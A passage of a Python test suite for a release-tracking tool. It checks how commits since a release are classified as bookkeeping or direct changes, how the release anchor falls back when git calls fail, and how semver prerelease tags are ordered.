        prawduct's own, a guess for any other repo: it never qualifies."""
        reopen = self._reopen(repo, state=None)
        assert _classify(repo, reopen).classification == bc.DIRECT

    def test_a_commit_cannot_declare_its_own_files_bookkeeping(self, repo):
        """The declaration is read at the commit's parent: one that adds the
        declaration and changes the files it names is direct."""
        reopen = self._reopen(repo, state_in_reopen=True)
        assert _classify(repo, reopen).classification == bc.DIRECT

    def test_a_declaration_added_after_the_release_never_qualifies(self, repo):
        """The two-commit route round the rule above: one metadata-only commit
        after the cut declares a source file a version file (it changes nothing
        judgeable, so it reads no-judgeable), and the next edits that file. The
        declaration must already have been in force at the release anchor, so
        the edit is direct."""
        reopen = self._reopen(repo)
        assert _classify(repo, reopen).classification == bc.RELEASE_BOOKKEEPING  # the control
        _commit(repo, {".prawduct/project-state.yaml": _DECLARING_STATE + "  - path: src/app.py\n"
                                                                          "    format: bare\n"},
                "declare a source file a version file")
        edit = _commit(repo, {"src/app.py": "x = 'anything'\n"}, "edit it")
        entry = _by_commit(bc.classify_pending(repo))[edit]
        assert entry.classification == bc.DIRECT, entry

    def test_a_commit_before_the_anchor_is_never_bookkeeping(self, repo):
        """A pending scope's commit before the anchor (one a pruned cut withheld)
        follows no release whose declaration this report reads: it is direct."""
        _commit(repo, {".prawduct/project-state.yaml": _DECLARING_STATE}, "declare version files")
        _cut(repo, "v0.9.0")
        withheld = _commit(repo, {"plugin/VERSION": "0.9.1\n", **_fragment("withheld")}, "a bump, withheld")
        cut = _cut(repo, "v1.0.0")
        report = bc.classify_pending(repo)
        assert report.anchor.commit == cut
        entry = _by_commit(report)[withheld]
        assert (entry.source, entry.classification) == (bc.SOURCE_FRAGMENT, bc.DIRECT), entry


class TestTheAnchorFailsTowardTheWiderWalk:
    """The anchor becomes a blocking release gate (Chunk 06): every failure in
    finding it must land older on the line, or on no anchor, never nearer."""

    def _tag_nearer_than_release_file(self, repo: Path) -> "tuple[str, str]":
        _merged(repo, "early")
        cut = _cut(repo, "v1.0.0", ship=("early",))
        tagged = _commit(repo, {"src/t.py": "t = 1\n"}, "tagged")
        _git(repo, "tag", "v1.0.1")
        _commit(repo, {"src/after.py": "a = 1\n"}, "after")
        return cut, tagged

    def test_a_tag_candidate_git_cannot_resolve_falls_back_to_the_release_file(self, repo, monkeypatch):
        cut, tagged = self._tag_nearer_than_release_file(repo)
        assert bc.release_anchor(repo, "main").commit == tagged  # the control
        monkeypatch.setattr(bc, "_oldest_containing", lambda *a, **k: None)
        anchor = bc.release_anchor(repo, "main")
        assert anchor is not None and (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor

    def test_a_tag_merge_base_git_cannot_read_falls_back_to_the_release_file(self, repo, monkeypatch):
        cut, _tagged = self._tag_nearer_than_release_file(repo)
        monkeypatch.setattr(bc, "_one_merge_base", lambda *a, **k: None)
        assert bc.release_anchor(repo, "main").commit == cut

    def test_a_release_file_git_cannot_read_leaves_the_tag(self, repo, monkeypatch):
        """And the other way: the release file nearer the tip, its read failing,
        leaves the older tag."""
        tagged = _commit(repo, {".prawduct/changes/.gitkeep": ""}, "x")
        _git(repo, "tag", "v0.9.0")
        cut = _cut(repo, "v1.0.0")
        assert bc.release_anchor(repo, "main").commit == cut  # the control
        monkeypatch.setattr(bc, "_release_file_records", lambda *a, **k: None)
        assert bc.release_anchor(repo, "main").commit == tagged

    def test_a_side_parent_check_git_cannot_answer_drops_the_release_file(self, repo, monkeypatch):
        """A merge record whose side parent git cannot list might have brought the
        file in from a side line: it is not taken as an anchor at that merge."""
        _git(repo, "checkout", "-q", "-b", "prep", "main")
        _commit(repo, {".prawduct/changes/.gitkeep": "", ".prawduct/releases/v1.0.0.md": "# v1.0.0\n"},
                "release: prep v1.0.0")
        _merge(repo, "prep")
        real = evidence.run_git

        def failing(project_dir, *args, **kwargs):
            if args[:1] == ("ls-tree",):
                return 128, "", "fatal: injected"
            return real(project_dir, *args, **kwargs)

        monkeypatch.setattr(bc.evidence, "run_git", failing)
        anchor, why = bc._resolve_anchor(repo, "main")
        assert anchor is None and "or git could not answer" in why, (anchor, why)

    def test_a_first_parent_line_git_cannot_list_is_no_anchor(self, repo, monkeypatch):
        _cut(repo, "v1.0.0")
        real = evidence.run_git

        def failing(project_dir, *args, **kwargs):
            if args[:2] == ("rev-list", "--first-parent"):
                return 128, "", "fatal: injected"
            return real(project_dir, *args, **kwargs)

        monkeypatch.setattr(bc.evidence, "run_git", failing)
        anchor, why = bc._resolve_anchor(repo, "main")
        assert anchor is None and "could not list the first-parent line" in why, (anchor, why)

    def test_criss_cross_merge_bases_resolve_to_their_common_ancestor(self):
        """Several best merge-bases: the answer is their own merge-base, never the
        newer of them."""
        calls = []

        def git(*args):
            calls.append(args)
            if args[:2] == ("merge-base", "--all"):
                return "aaa\nbbb"
            if args[:2] == ("merge-base", "--octopus"):
                return "root"
            return None

        assert bc._one_merge_base(git, "x", "y") == "root"
        assert ("merge-base", "--octopus", "aaa", "bbb") in calls

    def test_a_walk_git_cannot_run_is_its_own_unknown_entry(self, repo, monkeypatch):
        """Not a commit with an empty subject, and not counted as a walked commit:
        the count line says the walk could not run."""
        cut = _cut(repo, "v1.0.0")
        _commit(repo, {"src/direct.py": "d = 1\n"}, "direct")
        monkeypatch.setattr(bc._Classifier, "walk", lambda self, anchor: None)
        report = bc.classify_pending(repo)
        (entry,) = report.entries
        assert (entry.classification, entry.source, entry.commit) == (bc.UNKNOWN, bc.SOURCE_WALK_FAILED, None)
        line = bc.count_line(report)
        assert "0 of 1 covered" in line and f"the walk since release anchor {cut[:8]}" in line, line
        assert "could not run" in line and "judgeable commit(s) since" not in line, line
        rendered = bc.render(report)
        assert "(the walk since the release anchor)" in rendered and "(no fragment) ''" not in rendered
        assert "[not covered]" in rendered


class TestVersionOrder:
    def test_prerelease_identifiers_compare_as_semver_orders_them(self):
        ordered = ["v2.0.0-alpha", "v2.0.0-alpha.1", "v2.0.0-alpha.beta", "v2.0.0-beta.2",
                   "v2.0.0-beta.11", "v2.0.0-rc.1", "v2.0.0-rc.9", "v2.0.0-rc.10", "v2.0.0"]
        keys = [bc._version_key(name) for name in ordered]
        assert keys == sorted(keys), ordered
        assert len(set(keys)) == len(keys)

    def test_prerelease_tags_alone_are_no_tag_anchor(self, repo):
        """A prerelease tag is no release, so it is never the tag candidate
        (it anchored here, read numerically, until the native review's
        prerelease-anchor finding). A release file the cut wrote for a
        prerelease still anchors: the cut is the release record."""
        _commit(repo, {".prawduct/changes/.gitkeep": ""}, "x")
        _git(repo, "tag", "v2.0.0-rc.10")
        _commit(repo, {"src/b.py": "b = 1\n"}, "y")
        _git(repo, "tag", "v2.0.0-rc.9")
        assert bc.release_anchor(repo, "main") is None
        cut = _cut(repo, "v2.0.0-rc.11")
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor
